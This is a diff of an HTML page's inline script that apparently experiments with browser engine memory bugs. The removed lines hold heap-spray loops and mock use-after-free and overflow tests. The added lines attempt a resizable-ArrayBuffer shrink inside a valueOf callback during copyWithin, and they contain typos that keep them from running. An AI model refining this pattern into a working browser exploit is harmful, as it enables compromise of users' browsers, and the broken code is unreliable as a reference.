@@ -5,97 +5,26 @@
 
 <script>
 alert("Start?")
-  /* for (var i = 0; i < 32000; i++) {
-        let largeString = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-            largeString += largeString;
-            if (largeString.length > 1000000000) {
-                largeString = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".repeat(1000000);
-            }
-        
-     //= 50057; /* spray 4-field Object InstanceIDs
-    */
-
-   /*function controlleduaf() {
-    for (var i = 0; i < 32000; i++) {
-        // Simulate allocation of an object
-        let obj = { data: "important data" };
-
-        // Reference to the object
-        let ref = obj;
-
-        alert("Before freeing: " + ref.data); // Output: important data
-
-        // Simulate freeing the object
-        obj = null;
-
-        try {
-            // Attempt to use the reference after the object is "freed"
-            alert("After freeing: " + ref.data); // This should fail in a true use-after-free
-        } catch (e) {
-            alert("Error: " + e.message); // Catch any errors
-        }
-    }
-   }
-   function overflow_string() {
-    let largeString = "A".repeat(1000000); // 1 million A's
-    for (var i = 0; i < 8096; i++) {
-        largeString += largeString; // Double the size each time
-        if (largeString.length > 1000000000) { // Adjust the threshold as needed
-            largeString = "A".repeat(1000000); // Reset to prevent immediate crash
-        }
-       
-    }
-     
-   }
-   overflow_string()
-  //controlleduaf()
-  */
-  function overflow() {
+ /* function overflow() {
     let bufferArray = [];
-    let nestedArray = [];
-    let obj = {};
     for (var i = 0; i < 32000; i++) {
-//alert("Running //Aray Buffer Allocation Debug")
-        // Array buffer allocation
         bufferArray.push(new ArrayBuffer(1000000));
         if (bufferArray.length > 1000) {
             bufferArray = [];
         }
-//alert("Running /Nested Arrays")
-        // Nested arrays
-      //  nestedArray.push([]);
-    //   if (nestedArray.length > 1000) {
-       //     nestedArray = [];
-     //   }
-        
     }
-}
-  function simulateBufferOverflow() {
-    // Create an ArrayBuffer with a size of 16 bytes
-    let buffer = new ArrayBuffer(16);
-    let view = new DataView(buffer);
+} */
+  
 
-    // Write data to the buffer
-    view.setUint8(0, 1);  // Set byte at position 0
-    view.setUint8(1, 2);  // Set byte at position 1
-
-    console.log("Before overflow:", Array.from(new Uint8Array(buffer)));  // Outputs: [1, 2, 0, 0, ...]
-
-    // Attempt to write beyond the bounds of the buffer
-    try {
-        for (let i = 0; i < 4096; i++) {
-            view.setUint8(i, i);  // This will cause an error once i >= 16
-        }
-    } catch (e) {
-        alert("Error occurred:", e.message);  // Outputs error message
-    }
-
-    alert("After overflow attempt:", Array.from(new Uint8Array(buffer)));
-}
-
-;
-overflow()
-  simulateBufferOverflow()
+//overflow()
+    const ab = new ArrayBuffer(0x1000, {"maxByteLength": 0x4000});
+  const u8 = new Unit8Array(ab);
+  function call_back() { 
+    ab.resize(0);
+    return 0;
+  }
+  u8.copyWithib(0x20, {valueOf:call_back});
+  alert("Worked?:", {valueOf:callback});
 </script>
 </body>
 </html>
